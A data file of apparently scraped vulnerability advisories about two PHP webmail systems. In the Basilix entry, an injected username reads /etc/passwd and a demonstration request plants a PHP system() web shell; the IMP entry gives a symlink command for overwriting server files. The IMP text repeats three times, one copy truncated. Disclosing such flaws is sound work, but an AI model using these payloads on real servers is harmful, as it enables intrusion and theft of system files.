    "Description": "A vulnerability was reported in the Basilix web-based email gateway that allows a remtoe user to execute commands on the mail server with the privileges of the web server.\nIt is reported that a remote user can pass a specially crafted username containing shell commands to the mail gateway to cause it to execute arbitrary commands.  Because the Basilix system will first attempt to download email from a valid mail server, the remote user must set up a valid IMAP server in order to trigger the vulnerability.  The Basilix system reportedly allows the remote user to specify the IMAP server address and port number as part of the HTTP request.\n\nFor example, the remote user can send the username 'blah;cat%20/etc/passwd' to retrieve the password file from the web server.  A demonstration exploit string is provided below:\n\n[targethost]/basilix.php3?username=blah;echo%20\"<?system(\\$cmd);?>\">js/blah.php&p\nassword=blah&RequestID=LOGIN&domain=blah&bsx_domains[blah][imap_host]=\nblah.com.pl&bsx_domains[blah][imap_port]=143&bsx_domains[blah][domain]=su.th3_ti\nck&nocookie=1&BSX_TestCookie=1&SESSID=1\n\nThe vulnerable code reportedly exists in the file login.php3, where the system will attempt to create an attachment directory for the user.  The user-supplied username is executed by this code:\n\n$atch_dir = $BSX_ATCH_DIR . \"/\" . \"$IMAP_DOMAIN\" . \"/\" .\"$username\";\n.\n.\n.\n$mkcmd = \"/bin/mkdir -p $atch_dir\";\n@exec($mkcmd);",

    "Description": "A vulnerability was reported in the Internet Messaging Program (IMP) PHP-based e-mail system.  The security hole allows users to write arbitrary contents to existing files on the server.\nThe IMP webmail package reportedly uses predictable temporary filenames when processing uploaded attachments or when 'viewing' attachments.\n\nWhen a remote user composes a new e-mail message, any attachments are uploaded to the IMP server.  Some PHP code first processes the file upload and creates a temporary file (the file is created in the \"upload_tmp_dir\" specified in php.ini, or in /tmp).  The temporary filename is of the form \"/tmp/phpXXXXXX\", where the \"X\" characters are intended to be random.  Next, IMP's compose.php3 copies the temporary file for safekeeping.  The destination filename that IMP uses is /tmp/phpXXXXXX.att.  IMP reportedly fails to check if the destination file already exists (and the destination file is opened without the O_EXCL flag).  As a result, a local user can watch the temporary directory for phpXXXXXX files and can quickly create a symlink using the command:  'ln -s /tmp/phpXXXXXX.att /to/webserver_writable_file' to cause the IMP program to write an attachment to another existing file on the server.\n\nIn addition, IMP may allow local users to write to files on the server by another method.  IMP reportedly can use external viewers for viewing certain e-mail message attachments.  Before calling an external viewer, IMP (imp/lib/mimetypes.lib) will save the attachment to a temporary file using a filename of the form: /tmp/imp.'.date('Y-M-D_H:i:s').'__'.md5($contents).  As a result, the filename is easy to guess and the file is opened without O_EXCL.  This allows another opportunity for a local user to cause an existing file on the server to be overwritten.",

The security hole allows users to write arbitrary contents to existing files on the server.\nThe IMP webmail package reportedly uses predictable temporary filenames when processing uploaded attachments or when 'viewing' attachments.\n\nWhen a remote user composes a new e-mail message, any attachments are uploaded to the IMP server.  Some PHP code first processes the file upload and creates a temporary file (the file is created in the \"upload_tmp_dir\" specified in php.ini, or in /tmp).  The temporary filename is of the form \"/tmp/phpXXXXXX\", where the \"X\" characters are intended to be random.  Next, IMP's compose.php3 copies the temporary file for safekeeping.  The destination filename that IMP uses is /tmp/phpXXXXXX.att.  IMP reportedly fails to check if the destination file already exists (and the destination file is opened without the O_EXCL flag).  As a result, a local user can watch the temporary directory for phpXXXXXX files and can quickly create a symlink using the command:  'ln -s /tmp/phpXXXXXX.att /to/webserver_writable_file' to cause the IMP program to write an attachment to another existing file on the server.\n\nIn addition, IMP may allow local users to write to files on the server by another method.  IMP reportedly can use external viewers for viewing certain e-mail message attachments.  Before calling an external viewer, IMP (imp/lib/mimetypes.lib) will save the attachment to a temporary file using a filename of the form: /tmp/imp.'.date('Y-M-D_H:i:s').'__'.md5($contents).

    "Description": "A vulnerability was reported in the Internet Messaging Program (IMP) PHP-based e-mail system.  The security hole allows users to write arbitrary contents to existing files on the server.\nThe IMP webmail package reportedly uses predictable temporary filenames when processing uploaded attachments or when 'viewing' attachments.\n\nWhen a remote user composes a new e-mail message, any attachments are uploaded to the IMP server.  Some PHP code first processes the file upload and creates a temporary file (the file is created in the \"upload_tmp_dir\" specified in php.ini, or in /tmp).  The temporary filename is of the form \"/tmp/phpXXXXXX\", where the \"X\" characters are intended to be random.  Next, IMP's compose.php3 copies the temporary file for safekeeping.  The destination filename that IMP uses is /tmp/phpXXXXXX.att.  IMP reportedly fails to check if the destination file already exists (and the destination file is opened without the O_EXCL flag).  As a result, a local user can watch the temporary directory for phpXXXXXX files and can quickly create a symlink using the command:  'ln -s /tmp/phpXXXXXX.att /to/webserver_writable_file' to cause the IMP program to write an attachment to another existing file on the server.\n\nIn addition, IMP may allow local users to write to files on the server by another method.  IMP reportedly can use external viewers for viewing certain e-mail message attachments.  Before calling an external viewer, IMP (imp/lib/mimetypes.lib) will save the attachment to a temporary file using a filename of the form: /tmp/imp.'.date('Y-M-D_H:i:s').'__'.md5($contents).  As a result, the filename is easy to guess and the file is opened without O_EXCL.  This allows another opportunity for a local user to cause an existing file on the server to be overwritten.",
